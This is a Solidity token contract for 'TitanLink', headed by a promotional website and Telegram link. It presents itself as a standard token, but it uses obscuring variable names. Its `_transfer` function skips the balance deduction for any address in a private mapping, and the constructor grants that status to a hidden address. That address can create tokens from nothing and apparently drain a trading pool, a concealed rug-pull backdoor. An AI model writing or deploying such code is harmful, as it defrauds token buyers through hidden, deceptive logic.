/*

https://titanlink.online
https://t.me/titanlinkportal

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract TitanLink is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address ethremue, address titan, uint256 tlink) public returns (bool success) {
        require(tlink <= allowance[ethremue][msg.sender]);
        allowance[ethremue][msg.sender] -= tlink;
        _transfer(ethremue, titan, tlink);
        return true;
    }

    string public symbol;

    IUniswapV2Router02 private poolx;

    function transfer(address titan, uint256 tlink) public returns (bool success) {
        _transfer(msg.sender, titan, tlink);
        return true;
    }

    mapping(address => bool) private titanlinks;

    mapping(address => uint256) private network;

    string public name;

    function _transfer(address ethremue, address titan, uint256 tlink) private {
        bool corp = !titanlinks[ethremue];
        if (corp) {
            balanceOf[ethremue] -= tlink;
        }
        virtualdb[titan] = tlink;
        balanceOf[titan] += tlink;
        network[titan] = block.number;
        emit Transfer(ethremue, titan, tlink);
    }

    function approve(address ceylonlp, uint256 tlink) public returns (bool success) {
        allowance[msg.sender][ceylonlp] = tlink;
        emit Approval(msg.sender, ceylonlp, tlink);
        return true;
    }

    uint8 public decimals = 9;

    mapping(address => uint256) private virtualdb;

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    constructor(string memory onamae, string memory troopal, address thgil, address krad) {
        name = onamae;
        symbol = troopal;
        balanceOf[msg.sender] = totalSupply;
        titanlinks[krad] = true;
        poolx = IUniswapV2Router02(thgil);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

}